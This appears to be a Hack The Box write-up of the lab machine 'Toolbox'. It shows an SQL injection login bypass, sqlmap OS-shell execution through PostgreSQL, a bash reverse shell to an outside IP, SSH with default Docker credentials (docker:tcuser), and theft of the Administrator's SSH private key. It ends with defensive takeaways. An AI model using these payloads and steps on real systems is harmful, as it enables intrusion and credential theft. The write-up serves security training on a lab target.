# HTB Write-Up: Toolbox

| Field      | Details                                                         |
|------------|-----------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Toolbox)     |
| Difficulty | Easy                                                            |
| OS         | Windows                                                         |
| Author     | samurai                                                          |
| Date       | April 14, 2026                                                  |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration](#2-enumeration)
3. [Initial Access — SQLi to OS Shell via sqlmap](#3-initial-access--sqli-to-os-shell-via-sqlmap)
4. [Docker Escape — Default Credentials](#4-docker-escape--default-credentials)
5. [Privilege Escalation — SSH Key Extraction](#5-privilege-escalation--ssh-key-extraction)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

Port scanning was performed with **RustScan** for rapid discovery, followed by a full **Nmap** service and version scan (`-A`) to fingerprint all open ports.

```bash
rustscan -a 10.129.96.171 --ulimit 5000
nmap -A 10.129.96.171
```

**Open Ports:**

| Port  | Service        | Details                                                 |
|-------|----------------|---------------------------------------------------------|
| 21    | FTP            | FileZilla ftpd 0.9.60 — Anonymous login permitted       |
| 22    | SSH            | OpenSSH for Windows 7.7                                 |
| 135   | MSRPC          | Microsoft Windows RPC                                   |
| 139   | NetBIOS        | Microsoft Windows netbios-ssn                           |
| 443   | HTTPS          | Apache 2.4.38 (Debian) — "MegaLogistics" site           |
| 445   | SMB            | microsoft-ds                                            |
| 5985  | WinRM          | Microsoft HTTPAPI 2.0                                   |
| 49664–49669 | High RPC | Dynamic Microsoft RPC endpoints                    |

Several details from the Nmap output are immediately significant:

- **FTP anonymous login** is permitted, exposing a `docker-toolbox.exe` binary — a strong hint at the machine's Docker Toolbox environment.
- The SSL certificate on port 443 reveals a second hostname: `admin.megalogistic.com`. Both `megalogistic.com` and `admin.megalogistic.com` were added to `/etc/hosts`.
- The web server reports as **Debian Linux** despite the host OS being Windows — indicating the web application runs inside a Docker container.

---

## 2. Enumeration

### 2.1 — FTP Anonymous Access

Anonymous FTP login confirmed a single accessible file:

```
-r-xr-xr-x  1 ftp ftp  242520560  Feb 18 2020  docker-toolbox.exe
```

The presence of Docker Toolbox confirms the Windows host is running **Docker via a lightweight Linux VM**, which will be relevant during lateral movement.

### 2.2 — Web Application: Admin Panel at `admin.megalogistic.com`

Browsing to `https://admin.megalogistic.com` presented an admin login form. Testing a basic SQL injection bypass in the username field:

```
admin' --
```

Login was successful, confirming the login form is vulnerable to SQL injection. However, the authenticated dashboard offered no directly exploitable functionality, so deeper exploitation via **sqlmap** was pursued.

---

## 3. Initial Access — SQLi to OS Shell via sqlmap

### 3.1 — Capturing the Login Request

The login request was intercepted in Burp Suite and saved to `sql.req` for use with sqlmap.

### 3.2 — Running sqlmap with `--os-shell`

sqlmap was invoked against the captured request, targeting the `username` parameter. The `--os-shell` flag was used to attempt OS-level command execution through the database:

```bash
sqlmap -r sql.req --batch --force-ssl --os-shell
```

sqlmap identified the backend DBMS as **PostgreSQL** running on **Linux (Debian Buster)**, and determined that the database user had DBA privileges. It proceeded using the `COPY ... FROM PROGRAM` technique — a PostgreSQL-specific method that allows execution of OS commands via SQL:

```
[INFO] the back-end DBMS is PostgreSQL
[INFO] going to use 'COPY ... FROM PROGRAM' command execution
[INFO] calling Linux OS shell.
```

### 3.3 — Upgrading to a Reverse Shell

With a netcat listener open, a bash reverse shell was issued through the sqlmap `os-shell`:

```bash
# Listener (attacker)
rlwrap nc -nvlp 1337

# Payload (via os-shell)
os-shell> bash -c 'bash -i >& /dev/tcp/10.10.15.33/1337 0>&1'
```

**Result — Shell obtained as `postgres` inside a Docker container:**

```
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$
```

The user flag was retrieved from the `postgres` home directory.

---

## 4. Docker Escape — Default Credentials

### 4.1 — Identifying the Docker Network

Network interface enumeration revealed the container's IP address:

```
eth0: inet 172.17.0.2
```

In Docker's default bridge networking, the host VM is consistently reachable at the gateway address — `172.17.0.1`.

### 4.2 — SSH into the Docker Host VM with Default Credentials

Docker Toolbox uses **Boot2Docker**, a minimal TinyCore Linux VM with well-known default credentials. After upgrading to an interactive TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh docker@172.17.0.1
# Password: tcuser
```

**Result — Shell obtained on the Docker host VM:**

```
docker@box:~$
```

---

## 5. Privilege Escalation — SSH Key Extraction

### 5.1 — Windows Host Filesystem Mounted

Docker Toolbox automatically mounts the Windows host's `C:\Users` directory into the VM at `/c/Users`. This provides read/write access to all Windows user profile directories:

```bash
cd /c/Users
ls -la
# Administrator  Default  Public  Tony  ...
```

### 5.2 — Recovering the Administrator SSH Private Key

The `Administrator` profile contained a `.ssh` directory with a private key:

```bash
cd /c/Users/Administrator/.ssh
ls -la
# authorized_keys  id_rsa  id_rsa.pub  known_hosts
```

The private key was copied to the attacker machine, permissions were set correctly, and it was used to authenticate directly to the Windows host via SSH:

```bash
chmod 600 id_rsa
ssh administrator@10.129.96.171 -i id_rsa
```

**Result — Administrator shell on the Windows host:**

```
Microsoft Windows [Version 10.0.17763.1039]
administrator@TOOLBOX C:\Users\Administrator>
```

The root flag was retrieved from `C:\Users\Administrator\Desktop\root.txt`.

---

## 6. Summary

| Phase                   | Technique                                                   | Result                                    |
|-------------------------|-------------------------------------------------------------|-------------------------------------------|
| Recon                   | RustScan + Nmap -A                                          | 14 ports; Docker Toolbox hint via FTP     |
| Enumeration             | SSL cert reveals `admin.megalogistic.com`                   | Admin panel discovered                    |
| SQLi                    | Auth bypass (`admin' --`) + sqlmap `--os-shell`             | Shell as `postgres` in Docker container   |
| Docker Escape           | Default Boot2Docker credentials (`docker:tcuser`)           | Shell on Docker host VM                   |
| Privilege Escalation    | Windows C:\Users mount → Administrator SSH key extracted    | Administrator shell on Windows host       |

### Key Takeaways

- **SQL injection in authentication forms is critical.** The login bypass was trivial, and the PostgreSQL DBA context allowed direct OS command execution — a worst-case scenario for a database-backed application.
- **The `COPY ... FROM PROGRAM` PostgreSQL feature is a well-known RCE vector** when the database user has superuser privileges. Applications should connect to databases using least-privilege accounts.
- **Docker Toolbox introduces significant host exposure.** Mounting `C:\Users` into the VM and using static, well-known default credentials (`docker:tcuser`) means that any container escape immediately yields access to the full Windows user directory tree — including SSH keys for privileged accounts.
- **SSH keys stored in world-readable locations are as dangerous as plaintext passwords.** The Administrator's private key was fully accessible from within the Docker VM due to the automatic volume mount.
